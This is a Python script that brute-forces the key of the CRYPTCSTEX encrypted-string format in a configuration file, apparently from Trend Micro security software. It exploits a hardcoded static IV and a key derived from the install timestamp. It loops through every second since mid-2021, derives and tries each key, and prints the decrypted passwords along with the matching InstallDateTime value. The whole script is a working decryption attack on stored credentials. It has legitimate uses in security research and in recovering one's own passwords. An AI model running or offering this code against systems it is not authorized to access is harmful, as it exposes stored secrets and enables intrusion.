#!/usr/bin/python3
#
# Script to brute force keys for the CRYPTCSTEX format
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

import re
import sys
import time
import base64
import hashlib
from Crypto.Cipher import AES

# This script relies on Cryptodome's unpad so we can throw away junk
# decryptions with improper padding. This is only because we're
# bruteforcing and not using a proper key
from Crypto.Util.Padding import unpad

# AGE - set to epoch time before the server was likely installed
AGE = 1625097600

# Static IV
IV = b'\x17\x6c\x2a\xf2\x10\x86\x47\x7c\x7d\x5f\xc9\x64\xdd\x05\x38\x79'

def stristr(string, pattern):
    if re.search(pattern, string, re.IGNORECASE):
        return True
    else:
        return False

def validate(data):
    if data == None:
        return 0
    # The decrypted string should be ASCII-printable
    for i in range(len(data)):
        if data[i] < 0x30 or data[i] > 0x7e:
            return 0
    return 1

def cstex_decrypt(installtime, data):
    key = installtime.encode('utf-8')
    key = hashlib.sha1(key).hexdigest().upper()
    key = key[0:32].encode('utf-8')

    cipher = AES.new(key, AES.MODE_CBC, IV)
    try:
        decrypted = unpad(cipher.decrypt(data), 16)
        if validate(decrypted):
            return decrypted[3:]
    # We'll throw away any values that don't decrypt properly
    # aka don't have proper padding
    except ValueError:
        return None

def cstex_bruteforce(data):
    data = data.split('!CRYPTCSTEX!')[1]
    print("Attempting to find installtime key for: {}".format(data))
    # Extra padding since Trend doesn't
    data = base64.b64decode(data + '==')

    # Is this the best way to do this? Probably not
    now = int(time.time())
    for timestamp in range(AGE, now):
      installtime = time.strftime("%Y%m%d00%H%M%S", time.localtime(timestamp))
      decrypted = cstex_decrypt(installtime, data)
      if decrypted != None:
        print("**Candidate found**")
        print("\t{} : {}".format(installtime, decrypted.decode('utf-8')))
        print("\tTry adding this value to the password file above any CRYPTCSTEX strings")
        print("\tInstallDateTime ={}".format(installtime))

def main():
    if (len(sys.argv) < 2):
        print("""
Usage: %s [file.ini]

If the file does not contain any CRYPTCSTEX strings,
this script will do nothing
""" % (sys.argv[0]))
        return

    fname = sys.argv[1]
    with open(fname, 'r') as file:
        for line in file.readlines():
            line = line.rstrip()
            if line.startswith('#'):
                continue
            elif (stristr(line, "CRYPTCSTEX")):
                key, value = line.split('=')
                cstex_bruteforce(value)
                break

    print("Either no CRYPTCSTEX string found or we've tested every date in the script's current range!")
    print("If you couldn't find a valid date, try adjusting the values in the script")
    return

if __name__ == "__main__":
    main()
